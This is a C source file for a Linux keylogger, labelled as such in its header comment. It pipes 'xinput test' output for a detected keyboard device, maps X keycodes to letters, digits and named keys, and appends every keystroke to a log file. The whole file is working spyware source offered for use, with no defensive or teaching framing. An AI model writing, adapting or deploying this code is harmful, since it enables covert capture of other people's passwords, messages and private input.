/* A Keylogger program for linux platforms */

/* Dependancies : xinput */

#include<stdio.h>
#include<string.h>
#include<signal.h>
#include<stdlib.h>

#define SIZE 16

FILE *fp1 = NULL; //process descriptor for xinput
FILE *fp2 = NULL; //file descriptor to write keystrokes

//Wrap up file desciptor and process descriptor
static void catchInt(int signo)
{
  fclose(fp1);
  fclose(fp2);
  fp2 = fp1 = NULL;
  exit(EXIT_SUCCESS);
}

int main(int argc, char *argv[])
{
  int key=0;
  char buffer[SIZE];

  signal(SIGINT, catchInt); //waiting for the interruption and invokes catchInt

  if(argc!=2)
    goto exit;

  fp1 = popen("xinput test `xinput --list | sed -n '/AT/p' | awk '{ print $7 }' | cut -d '=' -f2` ", "r");
  fp2 = fopen(argv[1], "a");

  while (fgets(buffer, sizeof(buffer)-1,fp1))
  {
    if(sscanf(buffer,"key press   %d", &key))
       switch(key)
       {
         case 10: fputs("1", fp2); break;
         case 11: fputs("2", fp2); break;
         case 12: fputs("3", fp2); break;
         case 13: fputs("4", fp2); break;
         case 14: fputs("5", fp2); break;
         case 15: fputs("6", fp2); break;
         case 16: fputs("7", fp2); break;
         case 17: fputs("8", fp2); break;
         case 18: fputs("9", fp2); break;
         case 19: fputs("0", fp2); break;
         case 38: fputs("a", fp2); break;
         case 56: fputs("b", fp2); break;
         case 54: fputs("c", fp2); break;
         case 40: fputs("d", fp2); break;
         case 26: fputs("e", fp2); break;
         case 41: fputs("f", fp2); break;
         case 42: fputs("g", fp2); break;
         case 43: fputs("h", fp2); break;
         case 31: fputs("i", fp2); break;
         case 44: fputs("j", fp2); break;
         case 45: fputs("k", fp2); break;
         case 46: fputs("l", fp2); break;
         case 58: fputs("m", fp2); break;
         case 57: fputs("n", fp2); break;
         case 32: fputs("o", fp2); break;
         case 33: fputs("p", fp2); break;
         case 24: fputs("q", fp2); break;
         case 27: fputs("r", fp2); break;
         case 39: fputs("s", fp2); break;
         case 28: fputs("t", fp2); break;
         case 30: fputs("u", fp2); break;
         case 55: fputs("v", fp2); break;
         case 25: fputs("w", fp2); break;
         case 53: fputs("x", fp2); break;
         case 29: fputs("y", fp2); break;
         case 52: fputs("z", fp2); break;
         case 59: fputs(",", fp2); break;
         case 60: fputs(".", fp2); break;
         case 22: fputs("(backspace)",fp2);break;
         case 23: fputs("(tab)",      fp2);break;
         case 66: fputs("(caps)",     fp2);break;
         case 36: fputs("(enter)",    fp2);break;
         case 37: fputs("(ctrl)",     fp2);break;
         case 50: fputs("(shift)",    fp2);break;
         case 62: fputs("(shift)",    fp2);break;
         case 64: fputs("(alt)",      fp2);break;
         case 65: fputs(" ",          fp2);break;
         case 108:fputs("(alt)",      fp2);break;
         case 105:fputs("(ctrl)",     fp2);break;
         default: break;
       }
  }

  exit:return 0;
}
